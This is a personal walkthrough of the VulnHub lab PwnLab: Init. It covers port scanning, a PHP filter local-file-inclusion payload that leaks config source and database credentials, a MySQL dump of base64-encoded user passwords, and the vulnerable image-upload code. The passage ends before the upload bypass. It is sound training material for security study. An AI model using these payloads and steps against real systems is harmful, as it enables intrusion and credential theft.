# PwnLab: Init

https://www.vulnhub.com/entry/pwnlab-init,158/

Another lab taken from [abatchy's list](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms) of OSCP-like vulnhub instances.

## Port Recon

An all port scan gives:

```bash
kali@kali:~$ nmap -p- 192.168.1.70
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 01:13 EDT
Nmap scan report for 192.168.1.70
Host is up (0.016s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
3306/tcp  open  mysql
59496/tcp open  unknown
```

MySql and ssh both require creds. The rcpbind instance, when scanned more deeply, reveals nothing but rcpbind and 'status' listening on a variety of ports, including that 59496 port. At this stage, this means the only port of instance is 80.

## 'PwnLab Intranet Image hosting'

The website is a a simple site that allows image uploading for logged in users. A dirb, nikto, wfuzz all reveal:

- four apparent pages: index.php, login.php, upload.php and config.php. The last doesn't render anything, but does reveal a 200 code if visited.
- two directories that are listable: /upload/ and /images/ (the latter hosts the site's banner)

Importantly, the base page doesn't actually link to the others; instead it uses a `?page=` query string parameter that appears to load the other page content. I tried various attempted LFI techniques (local file inclusion) but none worked.

## A hint

I was stuck at this point. I don't like going for hints, but if I can't make any headway I go and skim someone elses walkthrough, or ask a friend. Typically its useful as I am new at this, and there is a lot I know I don't know and which I won't be able to figure out regardless of how much I bang my head against it. So, as long as I have had a good go at it, I view looking for a hint as being a learning opportunity.

It definitely was in this case; I wouldn't have guessed you can use a php filter with a LFI opportunity:

1. The use of ?page= indicates the core index page is loading the PHP from the indicated file and rendering it.
2. When dealing with LFI with PHP, there are a variety of techniques (e.g. documented here on [this nice medium post](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601))
3. After testing one or two, the one that worked was the use of a php filter with base 64 encoding.

Using a filter, when the site loaded the local resource (it would still only work with its local, defined resources), I could get it to output the base64 encoded content of the indicated reource, e.g. the config file:

`http://192.168.1.70/?page=php://filter/convert.base64-encode/resource=config` (rather than `?page=config`)

This prints the string on the page: `PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+` which decodes to (I used burp decoder):

```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

These credentials will be useful in the next step.

Additionally, I can decode the relevant section of index.php to see how this all works:

```php
if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
```

## MySql and login

I can use the credentials above to log into mysql remotely (`mysql -h <ip> -u root -p` plus the password from above). It contained a single table of note, containing the users for the site with encoded passwords:

```bash
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |                                                                                                                                                                                                 
| mike | U0lmZHNURW42SQ== |                                                                                                                                                                                                 
| kane | aVN2NVltMkdSbw== |                                                                                                                                                                                                 
+------+------------------+                                                                                                                                                                                                 
3 rows in set (0.001 sec)       
```

The encoding is obviously base64, though I can determine this for sure using the trick above to get the login page source code:

```php
$luser = $_POST['user'];
$lpass = base64_encode($_POST['pass']);

$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
```

Choosing kane (obviously, my Brotherhood of Nod allegience is strong), his password is decoded to `iSv5Ym2GRo`. I use this to log into the site.

## Bypassing the Image Uploader

After logging in, I can access the upload screen. An obvious first test is whether I can just upload a PHP shell, but it fails. Just renaming the shell also fails, so I grab the source from the upload page via the above technique:

```php
 <?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```
